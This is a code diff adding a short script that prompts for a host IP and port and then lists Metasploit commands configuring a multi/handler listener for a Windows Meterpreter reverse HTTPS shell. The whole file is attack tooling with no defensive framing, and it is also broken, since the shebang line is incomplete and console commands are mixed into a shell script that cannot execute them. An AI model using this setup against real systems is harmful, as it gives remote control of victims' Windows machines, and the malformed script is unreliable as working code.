@@ -1,0 +1,11 @@
+#!
+echo -e "Enter host ip:"
+read host
+clear
+echo "Enter host port:"
+read port
+use exploit/multi/handler
+set LHOST $host
+set LPORT $port
+set payload windows/meterpreter/reverse_https
+
